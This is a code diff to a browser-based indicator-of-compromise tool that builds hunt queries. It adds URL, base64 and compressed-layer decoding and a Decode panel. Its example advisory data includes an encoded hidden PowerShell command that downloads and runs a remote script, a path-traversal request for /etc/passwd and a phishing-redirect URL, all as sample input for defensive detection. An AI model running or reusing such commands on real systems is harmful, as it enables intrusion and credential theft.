@@ -164,6 +164,13 @@
   .sessions li span { min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
   .sessions small { color: var(--muted); }
   .sub { font-size: 0.95rem; font-weight: 600; margin: 18px 0 6px; }
+  #b64-in { min-height: 110px; }
+  .layer { border: 1px solid var(--line); border-radius: 6px; padding: 12px; margin-top: 12px; }
+  .layer-h { margin: 0 0 4px; font-weight: 600; font-size: 0.95rem; }
+  .layer-meta { color: var(--muted); font-size: 0.88rem; margin: 0 0 8px; word-break: break-all; }
+  .layer-meta code { font-family: var(--mono); font-size: 0.85rem; color: var(--ink); }
+  pre.hex { font: 12px/1.5 var(--mono); background: var(--bg); border: 1px solid var(--line); border-radius: 6px; padding: 10px; overflow-x: auto; margin: 0; }
+  textarea.layer-text[readonly] { min-height: 140px; }
   [hidden] { display: none !important; }
   footer { max-width: 1320px; margin: 28px auto 0; color: var(--muted); font-size: 0.85rem; }
   footer p { margin: 0 0 4px; max-width: 90ch; }
@@ -210,7 +217,9 @@
         <summary>Options</summary>
         <div class="inner">
           <label class="check"><input type="checkbox" id="sort"> Sort indicators within each type</label><br>
-          <label class="check" style="margin-top:8px"><input type="checkbox" id="collapse" checked> Drop paths already covered by a file name IOC (hunt query only)</label>
+          <label class="check" style="margin-top:8px"><input type="checkbox" id="collapse" checked> Drop paths already covered by a file name IOC (hunt query only)</label><br>
+          <label class="check" style="margin-top:8px"><input type="checkbox" id="inline-b64" checked> Find indicators inside base64 strings</label><br>
+          <label class="check" style="margin-top:8px"><input type="checkbox" id="url-dec" checked> Decode URL encoding such as <code>%2F</code></label>
         </div>
       </details>
 
@@ -235,6 +244,17 @@
           <ul class="sessions" id="sessions"></ul>
         </div>
       </details>
+    </section>
+
+    <section aria-labelledby="b64-h">
+      <h2 id="b64-h">Decode</h2>
+      <p class="hint">Paste base64, URL-encoded text or a whole command line. PowerShell text and gzip or deflate compression are handled, and nested layers are decoded in turn.</p>
+      <textarea id="b64-in" spellcheck="false" aria-label="Text to decode" placeholder="Encoded string, URL or command line"></textarea>
+      <div class="actions">
+        <button type="button" id="b64-clear">Clear</button>
+        <span class="status" id="b64-status" aria-live="polite"></span>
+      </div>
+      <div id="b64-out"></div>
     </section>
   </div>
 
@@ -492,6 +512,12 @@
         value = parsed.protocol + '//' + parsed.host.toLowerCase() + u.slice(u.indexOf(parsed.host) + parsed.host.length);
       } catch (e) { /* keep raw */ }
       items.push({ type: 'url', value });
+      const nested = u.slice(u.indexOf('://') + 3).match(/(?:https?|ftp):\/\/[^\s"'<>&]+/gi) || [];
+      nested.forEach(n => {
+        const nv = n.replace(/[.,;:!?]+$/, '');
+        items.push({ type: 'url', value: nv });
+        try { const h = new URL(nv).hostname.toLowerCase(); if (h.includes('.') && !/^\d{1,3}(\.\d{1,3}){3}$/.test(h)) items.push({ type: 'domain', value: h, derived: true }); } catch (e) { /* ignore */ }
+      });
       if (host) {
         if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) { if (validIp(host)) items.push({ type: 'ip', value: normIp(host), derived: true }); }
         else if (host.includes('.')) items.push({ type: 'domain', value: host.replace(/\.$/, ''), derived: true });
@@ -511,8 +537,139 @@
     });
     take(RE.ip, (m, ip) => validIp(ip) ? { type: 'ip', value: normIp(ip) } : { type: 'invalid', value: m });
     take(RE.file, m => ({ type: 'filename', value: m }));
-    take(RE.domain, (m, tld) => FILE_EXT_SET.has(tld.toLowerCase()) ? null : { type: 'domain', value: m.toLowerCase() });
+    take(RE.domain, (m, tld) => (FILE_EXT_SET.has(tld.toLowerCase()) || (tld !== tld.toLowerCase() && tld !== tld.toUpperCase())) ? null : { type: 'domain', value: m.toLowerCase() });
     return out;
+  }
+
+  // ---------- URL decoding ----------
+  function decodeRun(run) {
+    const bytes = run.match(/%[0-9a-f]{2}/gi).map(h => parseInt(h.slice(1), 16));
+    try { return { str: new TextDecoder('utf-8', { fatal: true }).decode(new Uint8Array(bytes)), ascii: bytes.every(b => b < 0x80) }; }
+    catch (e) { return { str: String.fromCharCode(...bytes), ascii: true }; }
+  }
+
+  // One pass of %XX decoding that remembers where each output character came from.
+  function decodeOnceMap(s) {
+    let text = '';
+    const map = [];
+    const re = /(?:%[0-9a-f]{2})+/gi;
+    let last = 0, m;
+    while ((m = re.exec(s)) !== null) {
+      for (let i = last; i < m.index; i++) { text += s[i]; map.push([i, i + 1]); }
+      const { str, ascii } = decodeRun(m[0]);
+      const end = m.index + m[0].length;
+      for (let k = 0; k < str.length; k++) {
+        map.push(ascii && str.length * 3 === m[0].length ? [m.index + 3 * k, m.index + 3 * k + 3] : [m.index, end]);
+      }
+      text += str;
+      last = end;
+    }
+    for (let i = last; i < s.length; i++) { text += s[i]; map.push([i, i + 1]); }
+    return { text, map };
+  }
+
+  // Repeats until stable (handles %252F style double encoding), composing the position maps.
+  function decodeMultiMap(s) {
+    let cur = { text: s, map: [...s].map((_, i) => [i, i + 1]) };
+    if (cur.map.length !== s.length) cur.map = Array.from({ length: s.length }, (_, i) => [i, i + 1]);
+    for (let pass = 0; pass < 4; pass++) {
+      const nx = decodeOnceMap(cur.text);
+      if (nx.text === cur.text) break;
+      cur = { text: nx.text, map: nx.map.map(([a, b]) => [cur.map[a][0], cur.map[b - 1][1]]) };
+    }
+    return cur;
+  }
+
+  const urlDecodeText = s => decodeMultiMap(s).text;
+
+  // For decoded URL, path and file name items, record the original encoded text as an extra variant.
+  function attachAlts(items, dm, base) {
+    const low = dm.text.toLowerCase();
+    for (const it of items) {
+      if (!['url', 'path', 'filename'].includes(it.type)) continue;
+      const idx = low.indexOf(it.value.toLowerCase());
+      if (idx < 0) continue;
+      const orig = base.slice(dm.map[idx][0], dm.map[idx + it.value.length - 1][1]);
+      if (orig !== it.value && /%[0-9a-f]{2}/i.test(orig)) it.alt = orig;
+    }
+  }
+
+  const variants = it => [it.value, ...(it.alts ? [...it.alts] : [])];
+  const altCount = list => list.reduce((a, i) => a + (i.alts ? i.alts.size : 0), 0);
+  const encNote = list => { const n = altCount(list); return n ? ', plus ' + n + ' URL-encoded form' + (n === 1 ? '' : 's') : ''; };
+
+  // ---------- base64 ----------
+  const B64_TOKEN = /[A-Za-z0-9+\/_-]{16,}={0,2}/g;
+
+  function b64Bytes(str) {
+    let t = str.replace(/\s+/g, '').replace(/-/g, '+').replace(/_/g, '/');
+    if (!/^[A-Za-z0-9+\/]*={0,2}$/.test(t)) return null;
+    t = t.replace(/=+$/, '');
+    if (!t.length || t.length % 4 === 1) return null;
+    t += '='.repeat((4 - t.length % 4) % 4);
+    try {
+      const bin = atob(t);
+      const b = new Uint8Array(bin.length);
+      for (let i = 0; i < bin.length; i++) b[i] = bin.charCodeAt(i);
+      return b;
+    } catch (e) { return null; }
+  }
+
+  function isTexty(t) {
+    const chars = [...t];
+    if (chars.length < 4) return false;
+    let good = 0, letters = 0;
+    for (const ch of chars) {
+      const c = ch.codePointAt(0);
+      if (c === 9 || c === 10 || c === 13 || (c >= 32 && c !== 127 && !(c >= 0x80 && c < 0xA0) && c !== 0xFFFD)) good++;
+      if ((c >= 65 && c <= 90) || (c >= 97 && c <= 122)) letters++;
+    }
+    return good / chars.length >= 0.95 && letters / chars.length >= 0.2;
+  }
+
+  function looksUtf16le(b) {
+    if (b.length >= 2 && b[0] === 0xFF && b[1] === 0xFE) return true;
+    if (b.length < 4) return false;
+    let zeros = 0, n = 0;
+    for (let i = 1; i < b.length && n < 400; i += 2, n++) if (b[i] === 0) zeros++;
+    return zeros / n > 0.6;
+  }
+
+  function bytesToText(b) {
+    try {
+      if (looksUtf16le(b)) {
+        const text = new TextDecoder('utf-16le').decode(b).replace(/^\uFEFF/, '');
+        return isTexty(text) ? { text, enc: 'UTF-16LE' } : null;
+      }
+      const text = new TextDecoder('utf-8', { fatal: true }).decode(b).replace(/^\uFEFF/, '');
+      return isTexty(text) ? { text, enc: 'UTF-8' } : null;
+    } catch (e) { return null; }
+  }
+
+  function b64Candidates(text, min) {
+    const out = [];
+    B64_TOKEN.lastIndex = 0;
+    let m;
+    while ((m = B64_TOKEN.exec(text)) !== null) {
+      const t = m[0];
+      if (t.length < min || /^[a-f0-9]+$/i.test(t) || !/[A-Z]/.test(t) || !/[a-z]/.test(t)) continue;
+      out.push(t);
+    }
+    return [...new Set(out)].sort((a, b) => b.length - a.length);
+  }
+
+  // Synchronous text-only decode used while parsing the indicator list.
+  function inlineB64(line, depth = 0) {
+    const texts = [];
+    for (const tok of b64Candidates(line, 20)) {
+      const b = b64Bytes(tok);
+      if (!b) continue;
+      const r = bytesToText(b);
+      if (!r) continue;
+      texts.push(r.text);
+      if (depth < 3) texts.push(...inlineB64(r.text, depth + 1));
+    }
+    return texts;
   }
 
   function parseTyped(line) {
@@ -546,16 +703,25 @@
         const e = map.get(key);
         if (!it.derived) { dupes++; if (e.derived) e.derived = false; }
         if (comment && !e.comment) e.comment = comment;
+        if (it.alt) e.alts.add(it.alt);
         return;
       }
       if (it.type === 'cidr' && it.cidr.changed) changedCidrs.push(it.cidr);
-      map.set(key, { type: it.type, value: it.value, comment: comment || '', derived: !!it.derived, cidr: it.cidr });
+      map.set(key, { type: it.type, value: it.value, comment: comment || (it.b64 ? 'Found in base64' : ''), derived: !!it.derived, b64: !!it.b64, alts: new Set(it.alt ? [it.alt] : []), cidr: it.cidr });
     };
     for (const raw of text.split(/\r?\n/)) {
       if (!raw.trim()) continue;
-      const line = refang(raw);
+      const base = refang(raw);
+      const dm = ($('url-dec').checked && /%[0-9a-f]{2}/i.test(base)) ? decodeMultiMap(base) : null;
+      const line = dm ? refang(dm.text) : base;
       const typed = parseTyped(line);
       const res = typed || { items: extract(line), comment: '' };
+      if (dm) attachAlts(res.items, dm, base);
+      if (!typed && $('inline-b64').checked) {
+        for (const t of inlineB64(line)) {
+          for (const l of t.split(/\r?\n/)) extract(refang($('url-dec').checked ? urlDecodeText(l) : l)).forEach(it => { it.derived = true; it.b64 = true; res.items.push(it); });
+        }
+      }
       res.items.forEach(it => add(it, res.comment));
       if (!res.items.length && !typed && /\d/.test(raw) && !/^\s*(\/\/|#)/.test(raw)) rejected.push(raw.trim());
     }
@@ -653,20 +819,20 @@
       blocks.push(['// ---- ' + g.domain.length + ' domain' + (g.domain.length === 1 ? '' : 's') + ', subdomains included ----', '/(^|[^a-z0-9\\-])(' + g.domain.map(d => reEsc(d.value)).join('|') + ')([^a-z0-9.\\-]|\\.([^a-z0-9\\-]|$)|$)/i']);
     }
     if (g.url.length) {
-      blocks.push(['// ---- ' + g.url.length + ' URL' + (g.url.length === 1 ? '' : 's') + ' ----', '/(' + g.url.map(u => reEsc(u.value)).join('|') + ')/i']);
+      blocks.push(['// ---- ' + g.url.length + ' URL' + (g.url.length === 1 ? '' : 's') + encNote(g.url) + ' ----', '/(' + g.url.flatMap(variants).map(reEsc).join('|') + ')/i']);
     }
     let paths = g.path;
     if ($('collapse').checked && g.filename.length && paths.length) {
       const names = new Set(g.filename.map(f => f.value.toLowerCase()));
-      const covered = paths.filter(p => names.has(p.value.split(/[\/\\]/).pop().toLowerCase()));
+      const covered = paths.filter(p => !p.alts.size && names.has(p.value.split(/[\/\\]/).pop().toLowerCase()));
       if (covered.length) notes.push(covered.length + ' path' + (covered.length === 1 ? ' is' : 's are') + ' left out of the hunt query because a file name IOC already matches ' + (covered.length === 1 ? 'it' : 'them') + '.');
       paths = paths.filter(p => !covered.includes(p));
     }
     if (paths.length) {
-      blocks.push(['// ---- ' + paths.length + ' path' + (paths.length === 1 ? '' : 's') + ' or URI' + (paths.length === 1 ? '' : 's') + ' ----', '/(' + paths.map(p => pathEsc(p.value)).join('|') + ')/i']);
+      blocks.push(['// ---- ' + paths.length + ' path' + (paths.length === 1 ? '' : 's') + ' or URI' + (paths.length === 1 ? '' : 's') + encNote(paths) + ' ----', '/(' + paths.flatMap(variants).map(pathEsc).join('|') + ')/i']);
     }
     if (g.filename.length) {
-      blocks.push(['// ---- ' + g.filename.length + ' file name' + (g.filename.length === 1 ? '' : 's') + ' (also match inside URIs and paths) ----', '/(^|[^\\w.\\-])(' + g.filename.map(f => pathEsc(f.value)).join('|') + ')([^\\w.\\-]|$)/i']);
+      blocks.push(['// ---- ' + g.filename.length + ' file name' + (g.filename.length === 1 ? '' : 's') + ' (also match inside URIs and paths)' + encNote(g.filename) + ' ----', '/(^|[^\\w.\\-])(' + g.filename.flatMap(variants).map(pathEsc).join('|') + ')([^\\w.\\-]|$)/i']);
     }
     if (!blocks.length) return { text: '', notes };
     const lines = header(g, 'Raw-text match across @rawstring. Run across all repos, 30 days or more.');
@@ -683,15 +849,16 @@
 
   function fieldExpr(t, f, items) {
     const vals = items.map(i => i.value);
+    const vv = items.flatMap(variants);
     switch (t) {
       case 'ip': return 'in(field=' + q(f) + ', values=[' + vals.map(q).join(', ') + '])';
       case 'cidr': return 'cidr(field=' + q(f) + ', subnet=[' + vals.map(q).join(', ') + '])';
       case 'sha256': case 'sha1': case 'md5':
         return 'in(field=' + q(f) + ', values=[' + vals.map(q).join(', ') + '], ignoreCase=true)';
       case 'domain': return fieldRef(f) + '=/(^|\\.)(' + vals.map(reEsc).join('|') + ')\\.?$/i';
-      case 'url': return fieldRef(f) + '=/(' + vals.map(reEsc).join('|') + ')/i';
-      case 'path': return fieldRef(f) + '=/(' + vals.map(pathEsc).join('|') + ')/i';
-      case 'filename': return fieldRef(f) + '=/(^|[\\\\\\/])(' + vals.map(pathEsc).join('|') + ')$/i';
+      case 'url': return fieldRef(f) + '=/(' + vv.map(reEsc).join('|') + ')/i';
+      case 'path': return fieldRef(f) + '=/(' + vv.map(pathEsc).join('|') + ')/i';
+      case 'filename': return fieldRef(f) + '=/(^|[\\\\\\/])(' + vv.map(pathEsc).join('|') + ')$/i';
     }
     return '';
   }
@@ -729,7 +896,8 @@
     const head = 'indicator,ioc_type,ioc_tlp,ioc_source,ioc_comment';
     const row = it => [it.value, it.type, tlp, src, it.comment].map(csvCell).join(',');
     const ordered = TYPES.flatMap(([t]) => g[t]);
-    const csv = ordered.length ? [head, ...ordered.map(row)].join('\n') : '';
+    const rows = ordered.flatMap(it => [row(it), ...[...(it.alts || [])].map(a => row({ type: it.type, value: a, comment: 'URL-encoded form of ' + it.value }))]);
+    const csv = rows.length ? [head, ...rows].join('\n') : '';
     const cidrCsv = g.cidr.length ? [head, ...g.cidr.map(row)].join('\n') : '';
     const names = lookupNames();
     const inc = 'include=[ioc_type, ioc_tlp, ioc_comment]';
@@ -764,6 +932,8 @@
     TYPES.forEach(([t, l]) => {
       if (g[t].length) blocks.push('# ' + l + ' (' + g[t].length + ')\n' + g[t].map(i => i.value).join('\n'));
     });
+    const enc = TYPES.flatMap(([t]) => g[t]).flatMap(i => i.alts ? [...i.alts] : []);
+    if (enc.length) blocks.push('# URL-encoded forms, as originally seen (' + enc.length + ')\n' + enc.join('\n'));
     return blocks.join('\n\n');
   }
 
@@ -813,8 +983,12 @@
     const broad = g.cidr.filter(c => c.cidr.prefix < 16).map(c => c.value);
     if (broad.length) notes.push(['warn', 'Very broad range' + (broad.length === 1 ? '' : 's') + ' will be noisy: <code>' + esc(broad.join(', ')) + '</code>']);
     if (parsed.changedCidrs.length) notes.push(['info', 'CIDR normalised to the network address: ' + parsed.changedCidrs.map(c => '<code>' + esc(c.original) + '</code> to <code>' + esc(c.value) + '</code>').join(', ')]);
-    const derived = active.filter(i => i.derived);
-    if (derived.length) notes.push(['info', derived.length + ' domain or IP' + (derived.length === 1 ? ' was' : 's were') + ' taken from URL hosts: <code>' + esc(derived.map(d => d.value).join(', ')) + '</code>']);
+    const fromB64 = active.filter(i => i.derived && i.b64);
+    if (fromB64.length) notes.push(['warn', fromB64.length + ' indicator' + (fromB64.length === 1 ? ' was' : 's were') + ' found inside base64 strings. Review them before hunting, and use the type buttons or allowlist to drop noise: <code>' + esc(fromB64.map(d => d.value).join(', ')) + '</code>']);
+    const encoded = active.filter(i => i.alts && i.alts.size);
+    if (encoded.length) notes.push(['info', encoded.length + ' indicator' + (encoded.length === 1 ? ' was' : 's were') + ' URL-decoded. The queries and lookup file also match the original encoded form: <code>' + esc(encoded.flatMap(i => [...i.alts]).join(', ')) + '</code>']);
+    const derived = active.filter(i => i.derived && !i.b64);
+    if (derived.length) notes.push(['info', derived.length + (derived.length === 1 ? ' domain or IP was' : ' domains or IPs were') + ' taken from URL hosts: <code>' + esc(derived.map(d => d.value).join(', ')) + '</code>']);
     if (parsed.dupes) notes.push(['info', parsed.dupes + ' duplicate' + (parsed.dupes === 1 ? '' : 's') + ' removed.']);
     if (allow.removed.length) notes.push(['info', allow.removed.length + ' indicator' + (allow.removed.length === 1 ? '' : 's') + ' removed by the allowlist: <code>' + esc(allow.removed.map(r => r.value).join(', ')) + '</code>']);
     hunt.notes.forEach(n => notes.push(['info', esc(n)]));
@@ -973,6 +1147,194 @@
     }
   });
 
+  // ---------- base64 decoder panel ----------
+  const MAGIC = [
+    [[0x4D, 0x5A], 'Windows executable (MZ header)'],
+    [[0x7F, 0x45, 0x4C, 0x46], 'ELF executable'],
+    [[0x1F, 0x8B], 'gzip compressed data', 'gzip'],
+    [[0x50, 0x4B, 0x03, 0x04], 'ZIP archive (also Office documents, JAR, APK)'],
+    [[0x25, 0x50, 0x44, 0x46], 'PDF document'],
+    [[0xD0, 0xCF, 0x11, 0xE0], 'OLE compound file (legacy Office, MSI)'],
+    [[0x52, 0x61, 0x72, 0x21], 'RAR archive'],
+    [[0x37, 0x7A, 0xBC, 0xAF], '7-Zip archive'],
+    [[0xCF, 0xFA, 0xED, 0xFE], 'Mach-O executable'],
+    [[0xCA, 0xFE, 0xBA, 0xBE], 'Mach-O universal binary or Java class'],
+    [[0x4D, 0x53, 0x43, 0x46], 'Microsoft cabinet file'],
+    [[0x89, 0x50, 0x4E, 0x47], 'PNG image'],
+    [[0xFF, 0xD8, 0xFF], 'JPEG image'],
+    [[0x7B, 0x5C, 0x72, 0x74], 'RTF document']
+  ];
+  function magicOf(b) {
+    for (const [sig, label, fmt] of MAGIC) if (sig.every((v, i) => b[i] === v)) return { label, fmt };
+    if (b[0] === 0x78 && [0x01, 0x5E, 0x9C, 0xDA].includes(b[1])) return { label: 'zlib compressed data', fmt: 'deflate' };
+    return null;
+  }
+
+  async function inflate(bytes, fmt) {
+    if (typeof DecompressionStream === 'undefined') return null;
+    try {
+      const stream = new Response(bytes).body.pipeThrough(new DecompressionStream(fmt));
+      const out = new Uint8Array(await new Response(stream).arrayBuffer());
+      return out.length ? out : null;
+    } catch (e) { return null; }
+  }
+
+  async function sha256Hex(bytes) {
+    try {
+      if (!window.crypto || !crypto.subtle) return '';
+      const d = await crypto.subtle.digest('SHA-256', bytes);
+      return [...new Uint8Array(d)].map(x => x.toString(16).padStart(2, '0')).join('');
+    } catch (e) { return ''; }
+  }
+
+  function hexDump(b, max = 256) {
+    const rows = [];
+    for (let o = 0; o < Math.min(b.length, max); o += 16) {
+      const chunk = [...b.slice(o, o + 16)];
+      const hex = chunk.map(x => x.toString(16).padStart(2, '0')).join(' ').padEnd(47, ' ');
+      const asc = chunk.map(x => (x >= 32 && x < 127) ? String.fromCharCode(x) : '.').join('');
+      rows.push(o.toString(16).padStart(8, '0') + '  ' + hex + '  ' + asc);
+    }
+    if (b.length > max) rows.push('... ' + (b.length - max).toLocaleString() + ' more bytes');
+    return rows.join('\n');
+  }
+
+  function indicatorsIn(text) {
+    const seen = new Map();
+    for (const l of text.split(/\r?\n/)) {
+      for (const it of extract(refang(l))) if (it.type !== 'invalid') seen.set(it.type + '|' + it.value.toLowerCase(), it.value);
+    }
+    return [...seen.values()];
+  }
+
+  // Works out what a decoded buffer is and what (if anything) to decode next.
+  async function analyse(bytes) {
+    const txt = bytesToText(bytes);
+    if (txt) {
+      let next = null;
+      const t = txt.text.trim();
+      if (/%[0-9a-f]{2}/i.test(t)) {
+        const dec = urlDecodeText(t);
+        if (dec !== t) next = { bytes: new TextEncoder().encode(dec), how: 'URL-decoded from the previous layer' };
+      }
+      if (!next && /^[A-Za-z0-9+\/_-]{8,}={0,2}$/.test(t)) {
+        const b = b64Bytes(t);
+        if (b && (bytesToText(b) || magicOf(b))) next = { bytes: b, how: 'Base64-decoded from the previous layer' };
+      }
+      if (!next) for (const tok of b64Candidates(txt.text, 24)) {
+        const b = b64Bytes(tok);
+        if (b && (bytesToText(b) || magicOf(b) || await inflate(b, 'deflate-raw'))) { next = { bytes: b, how: 'Base64-decoded from a string inside the previous layer' }; break; }
+      }
+      return { kind: 'text', text: txt.text, enc: txt.enc, next };
+    }
+    const mg = magicOf(bytes);
+    if (mg && mg.fmt) {
+      const out = await inflate(bytes, mg.fmt);
+      return { kind: 'compressed', label: mg.label, size: bytes.length, next: out ? { bytes: out, how: 'Decompressed from the previous layer' } : null, failed: !out };
+    }
+    if (!mg) {
+      const out = await inflate(bytes, 'deflate-raw');
+      if (out && (bytesToText(out) || magicOf(out))) return { kind: 'compressed', label: 'Raw deflate compressed data', size: bytes.length, next: { bytes: out, how: 'Decompressed from the previous layer' } };
+    }
+    return { kind: 'binary', label: mg ? mg.label : 'Binary data, type not recognised', bytes, sha: await sha256Hex(bytes) };
+  }
+
+  function addToIndicators(values) {
+    const cur = $('input').value;
+    $('input').value = (cur.trim() ? cur.replace(/\s*$/, '\n') : '') + values.join('\n');
+    render();
+    $('b64-status').textContent = 'Added ' + values.length + ' indicator' + (values.length === 1 ? '' : 's') + ' to the list.';
+  }
+
+  function el(tag, cls, text) {
+    const e = document.createElement(tag);
+    if (cls) e.className = cls;
+    if (text != null) e.textContent = text;
+    return e;
+  }
+
+  let b64Run = 0, b64Timer = null;
+  async function decodePanel() {
+    const run = ++b64Run;
+    const raw = $('b64-in').value.trim();
+    const out = $('b64-out');
+    const status = $('b64-status');
+    if (!raw) { out.replaceChildren(); status.textContent = ''; return; }
+
+    let bytes = null, how = '';
+    const whole = raw.replace(/\s+/g, '');
+    const urlDec = /%[0-9a-f]{2}/i.test(raw) ? urlDecodeText(raw) : raw;
+    if (urlDec !== raw) { bytes = new TextEncoder().encode(urlDec); how = 'URL-decoded from the pasted text'; }
+    else if (/^[A-Za-z0-9+\/_-]+={0,2}$/.test(whole) && b64Bytes(whole)) { bytes = b64Bytes(whole); how = 'Base64-decoded from the pasted text'; }
+    else for (const t of b64Candidates(raw, 16)) { const b = b64Bytes(t); if (b) { bytes = b; how = 'Base64-decoded from the longest encoded string in the pasted text'; break; } }
+    if (!bytes) {
+      out.replaceChildren();
+      status.textContent = 'Nothing to decode. Paste base64 or URL-encoded text.';
+      return;
+    }
+
+    const layers = [];
+    for (let depth = 0; depth < 8 && bytes; depth++) {
+      const a = await analyse(bytes);
+      if (run !== b64Run) return;
+      a.how = how;
+      layers.push(a);
+      if (!a.next) break;
+      bytes = a.next.bytes; how = a.next.how;
+    }
+
+    const frag = document.createDocumentFragment();
+    layers.forEach((a, i) => {
+      const box = el('div', 'layer');
+      let title;
+      if (a.kind === 'text') title = 'Layer ' + (i + 1) + ': ' + a.enc + ' text, ' + [...a.text].length.toLocaleString() + ' characters';
+      else if (a.kind === 'compressed') title = 'Layer ' + (i + 1) + ': ' + a.label + ', ' + a.size.toLocaleString() + ' bytes';
+      else title = 'Layer ' + (i + 1) + ': ' + a.label + ', ' + a.bytes.length.toLocaleString() + ' bytes';
+      box.append(el('p', 'layer-h', title), el('p', 'layer-meta', a.how + '.'));
+
+      if (a.kind === 'text') {
+        const ta = el('textarea', 'short layer-text');
+        ta.readOnly = true; ta.spellcheck = false; ta.value = a.text;
+        ta.setAttribute('aria-label', 'Decoded text, layer ' + (i + 1));
+        const found = indicatorsIn(a.text);
+        const acts = el('div', 'actions');
+        const copy = el('button', '', 'Copy text'); copy.type = 'button';
+        copy.addEventListener('click', async () => {
+          try { await navigator.clipboard.writeText(a.text); } catch (e) { ta.select(); document.execCommand('copy'); }
+          status.textContent = 'Copied layer ' + (i + 1) + '.';
+        });
+        acts.append(copy);
+        if (found.length) {
+          const add = el('button', 'primary', 'Add ' + found.length + ' indicator' + (found.length === 1 ? '' : 's') + ' to the list'); add.type = 'button';
+          add.addEventListener('click', () => addToIndicators(found));
+          acts.append(add);
+          box.append(ta, el('p', 'layer-meta', 'Indicators found: ' + found.slice(0, 15).join(', ') + (found.length > 15 ? ', and ' + (found.length - 15) + ' more' : '')), acts);
+        } else {
+          box.append(ta, acts);
+        }
+      } else if (a.kind === 'compressed') {
+        if (a.failed) box.append(el('p', 'layer-meta', typeof DecompressionStream === 'undefined' ? 'This browser cannot decompress data. Try a current version of Chrome, Edge, Firefox or Safari.' : 'Decompression failed. The data may be truncated or corrupted.'));
+      } else {
+        if (a.sha) {
+          const meta = el('p', 'layer-meta');
+          meta.append('SHA256 ', el('code', '', a.sha));
+          const acts = el('div', 'actions');
+          const add = el('button', 'primary', 'Add SHA256 to the list'); add.type = 'button';
+          add.addEventListener('click', () => addToIndicators([a.sha]));
+          acts.append(add);
+          box.append(meta, el('pre', 'hex', hexDump(a.bytes)), acts);
+        } else {
+          box.append(el('pre', 'hex', hexDump(a.bytes)));
+        }
+      }
+      frag.append(box);
+    });
+    out.replaceChildren(frag);
+    status.textContent = layers.length + ' layer' + (layers.length === 1 ? '' : 's') + ' decoded.';
+  }
+  $('b64-in').addEventListener('input', () => { clearTimeout(b64Timer); b64Timer = setTimeout(decodePanel, 150); });
+  $('b64-clear').addEventListener('click', () => { $('b64-in').value = ''; decodePanel(); $('b64-in').focus(); });
+
   // ---------- wiring ----------
   $('example').addEventListener('click', () => {
     $('source').value = 'Example advisory';
@@ -988,7 +1350,10 @@
       'TLP:AMBER\tMD5\td41d8cd98f00b204e9800998ecf8427e',
       'Beacons to hxxps://cdn-sync[.]example/api/v2/check and 192[.]0[.]2[.]44:8443',
       'Dropper staged at C:\\ProgramData\\Sync\\svc-update.exe',
+      'Loader ran: powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA3ADcALwBhAC4AcABzADEAJwApAA==',
       '203[.]0[.]113[.]10',
+      'Phishing redirect: hxxps://sso-login[.]example/r?next=https%3A%2F%2Fcapture-portal.example%2Fowa%2Fauth.php',
+      'Exploit attempt: GET /vpn/..%2F..%2Fetc%2Fpasswd',
       '300[.]1[.]1[.]1'
     ].join('\n');
     render();
@@ -999,7 +1364,7 @@
   $('agg').addEventListener('change', () => { syncAgg(); render(); });
   ['input', 'source', 'allowlist', 'filters', 'table-fields', 'group-fields', 'collect-fields', 'tz', 'lookup-name']
     .forEach(id => $(id).addEventListener('input', render));
-  ['sort', 'collapse'].forEach(id => $(id).addEventListener('change', render));
+  ['sort', 'collapse', 'inline-b64', 'url-dec'].forEach(id => $(id).addEventListener('change', render));
 
   try { $('tz').value = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) { /* leave blank */ }
   buildFieldMap();
